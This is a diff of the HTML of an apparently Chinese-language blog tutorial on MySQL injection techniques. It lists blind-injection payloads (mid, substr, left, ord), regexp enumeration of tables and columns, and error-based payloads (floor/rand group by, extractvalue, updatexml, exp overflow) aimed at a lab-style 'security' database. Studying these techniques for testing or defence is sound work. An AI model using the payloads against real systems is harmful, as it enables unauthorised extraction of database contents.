@@ -448,48 +448,31 @@ concat_ws() 格式：concat_ws(‘_’,id,name) 分割符在第一个参数 如�
 </li>
 </ul>
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
-<li><p><code>mid()函数</code><br>格式如下：mid(column_name,start[,length])<br>column_name:想要获取的字段的名称，为必须参数<br>start:选择获取的起始位置<br>length:需要返回的字符数<br>例：and (mid(database(),1,1))=’s’ ,则字段第一位为s，测试第二位则修改start字段，payload为and (mid(database(),2,1))=’e’，以此类推。在实际应用中也可以添加ascii函数来帮助我们快速获取对应ascii码的值，例：and (ascii(mid(database(),1,1)))&gt;100<br>同样在column_name字段也可以构造sql语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (mid((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;&apos;e&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>substr()函数</code><br>substr()和substring()函数是同样的功能，均为截取字符<br>格式如下：substr(string,start,length)<br>string参数为需要获取的字符，start为起始的位置，length为截取的长度<br>例：and (substr(database(),1,1))&gt;’a’ ，同理mid()函数测试第二位则修改start参数，and (substr(database(),2,1))&gt;’a’<br>同样在string字段也可以构造sql语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (substr((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=&apos;security&apos; limit 0,1),1,1))=&apos;e&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>left()函数</code><br>left()得到字符串左部指定个数的字符<br>格式如下：<br>left(string,n),string为要获取的字段,n为长度<br>例：and (left(database(),1))&gt;’s’ ，确定了第一位，测试一、二位则修改n字段，and (left(database(),2))&gt;’se’，以此类推<br>同样在string字段也可以构造sql语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (left((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=&apos;security&apos; limit 0,1),1))&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>ord()函数</code><br>此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用，例：and (ord(left(database(),1)))&gt;100</p>
-</li>
+<li><code>mid()函数</code><br>格式如下：mid(column_name,start[,length])<br>column_name:想要获取的字段的名称，为必须参数<br>start:选择获取的起始位置<br>length:需要返回的字符数<br>例：and (mid(database(),1,1))=’s’ ,则字段第一位为s，测试第二位则修改start字段，payload为and (mid(database(),2,1))=’e’，以此类推。在实际应用中也可以添加ascii函数来帮助我们快速获取对应ascii码的值，例：and (ascii(mid(database(),1,1)))&gt;100<br>同样在column_name字段也可以构造sql语句,and (mid((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1,1))&gt;’e’</li>
+</ul>
+<ul>
+<li><code>substr()函数</code><br>substr()和substring()函数是同样的功能，均为截取字符<br>格式如下：substr(string,start,length)<br>string参数为需要获取的字符，start为起始的位置，length为截取的长度<br>例：and (substr(database(),1,1))&gt;’a’ ，同理mid()函数测试第二位则修改start参数，and (substr(database(),2,1))&gt;’a’<br>同样在string字段也可以构造sql语句,and (substr((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1,1))=’e’</li>
+</ul>
+<ul>
+<li><code>left()函数</code><br>left()得到字符串左部指定个数的字符<br>格式如下：<br>left(string,n),string为要获取的字段,n为长度<br>例：and (left(database(),1))&gt;’s’ ，确定了第一位，测试一、二位则修改n字段，and (left(database(),2))&gt;’se’，以此类推<br>同样在string字段也可以构造sql语句,and (left((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1))&gt;’a’</li>
+</ul>
+<ul>
+<li><code>ord()函数</code><br>此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用，例：and (ord(left(database(),1)))&gt;100</li>
 </ul>
 <h2 id="正则表达式注入"><a href="#正则表达式注入" class="headerlink" title="正则表达式注入"></a>正则表达式注入</h2><ul>
-<li><p>跑表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select 1 from information_schema.tables where table_schema=&apos;security&apos; and table_name regexp &apos;^em[a-z]&apos;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>跑字段名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select 1 from information_schema.columns where table_name=&apos;user&apos; and column_name regexp &apos;^a[a-z]&apos; limit 0,1)</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>跑表名：<br>and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^em[a-z]’)</li>
 </ul>
-<p>需要注意的是使用regexp在跑表名的时候，因为前面的已经加了条件数据库指明为security，且返回列只有数据库名，所有不需要limit来限定区域，但在跑字段名时就算前面加了条件限制了表名为user，但返回的列不止一行，所有就需要使用limit来再次限制区域。<br><code>limit：</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from 表名 WHERE 条件 limit 5,10; //检索6-15条数据</span><br><span class="line">SELECT * from 表名 WHERE 条件 limit 5,-1; //检索6到最后一条数据</span><br><span class="line">SELECT * from 表名 WHERE 条件 limit 5; //检索前5条数据</span><br></pre></td></tr></table></figure>
-
+<ul>
+<li>跑字段名：<br>and 1=(select 1 from information_schema.columns where table_name=’user’ and column_name regexp ‘^a[a-z]’ limit 0,1)<br>需要注意的是使用regexp在跑表名的时候，因为前面的已经加了条件数据库指明为security，且返回列只有数据库名，所有不需要limit来限定区域，但在跑字段名时就算前面加了条件限制了表名为user，但返回的列不止一行，所有就需要使用limit来再次限制区域。<br><code>limit：</code><br>SELECT * from 表名 WHERE 条件 limit 5,10; //检索6-15条数据<br>SELECT * from 表名 WHERE 条件 limit 5,-1; //检索6到最后一条数据<br>SELECT * from 表名 WHERE 条件 limit 5; //检索前5条数据</li>
+</ul>
 <p>具体如下图：</p>
 <p><img src="/image/2.png" alt="如图"></p>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
-<li><p><code>floor()函数</code><br>只要是count，rand()，group by三个连用就会造成报错，这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据，具体payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.`tables` group by concat((select version()),floor(rand(0)*2)))</span><br></pre></td></tr></table></figure>
+<li><p><code>floor()函数</code><br>只要是count，rand()，group by三个连用就会造成报错，这种报错方法的本质是因为floor(rand(0)<em>2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据，具体payload如下：<br>and (select count(</em>) from information_schema.<code>tables</code> group by concat((select version()),floor(rand(0)*2)))</p>
 </li>
-<li><p><code>extractvalue和updatexml函数</code><br>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml，<br>样式如下：<br>select extractvalue(1,’/a/b’);<br>select updatexml(1,’/a/b’,1);<br>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里<br><code>Extractvalue()</code><br>用法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
-
-
+<li><p><code>extractvalue和updatexml函数</code><br>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml，<br>样式如下：<br>select extractvalue(1,’/a/b’);<br>select updatexml(1,’/a/b’,1);<br>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里<br><code>Extractvalue()</code><br>用法：<br>and (select extractvalue(1,concat(0x7e,(select user()),0x7e)))<br><code>Updatexml()</code><br>用法：<br>and (select updatexml(1,concat(0x7e,(select user()),0x7e),1))</p>
 </li>
-</ul>
-<p><code>Updatexml()</code><br>用法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>exp()</code><br>只有在mysql版本大于5.5.5时，才可以使用整形溢出报错<br>Exp()<br>用法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br></pre></td></tr></table></figure>
-
+<li><p><code>exp()</code><br>只有在mysql版本大于5.5.5时，才可以使用整形溢出报错<br>Exp()<br>用法：<br>mysql&gt; select exp(~(select*from(select user())x));</p>
 </li>
 </ul>
 <p>ps：但不知道为什么在mysql 5.5.53版本使用失败</p>
